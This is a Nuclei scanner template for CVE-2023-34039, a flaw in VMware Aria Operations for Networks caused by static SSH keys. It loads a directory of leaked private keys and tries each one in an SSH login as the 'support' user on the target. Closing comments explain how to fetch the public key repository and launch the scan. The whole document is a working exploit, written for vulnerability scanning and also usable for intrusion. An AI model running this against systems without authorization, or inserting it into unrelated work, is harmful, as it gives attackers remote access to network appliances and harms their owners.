id: cve-2023-34039

info:
  name: CVE-2023-34039
  author: tarunKoyalwar
  severity: high
  description: |
    VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE (CVE-2023-34039)
    Version: All versions from 6.0 to 6.10

variables:
  keysDir: "helpers/"  # load all private keys from this directory

javascript:
    # init field can be used to make any preperations before the actual exploit
    # here we are reading all private keys from helpers folder and storing them in a list
  - init: |
      let m = require('nuclei/fs');
      let privatekeys = m.ReadFilesFromDir(keysDir)
      updatePayload('keys',privatekeys)

  # check if port is open before bruteforcing
    pre-condition: |
      isPortOpen(Host,Port)

  # actual exploit
    code: |
      let m = require('nuclei/ssh')
      let c = m.SSHClient()
      c.ConnectWithKey(Host,Port,'support@'+Host,key)
      
    args:
      Host: "{{Host}}"
      Port: "22"
      key: "{{keys}}"
      keysDir: "{{keysDir}}"

    payloads:
      # 'keys' will be updated by actual private keys after init is executed
      keys: 
        - dummy1
        - dummy2
    threads: 10
    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - print_debug(error) # remove this
          - success == true
        condition: and


## downloading and running 
# git clone https://github.com/sinsinology/CVE-2023-34039.git cvedata
# mkdir allkeys
# find ./cvedata/keys -type f | xargs -I {} cp -v {} allkeys
# ./nuclei -u scanme.sh -t a.yaml  -V keysDir=allkeys -lfa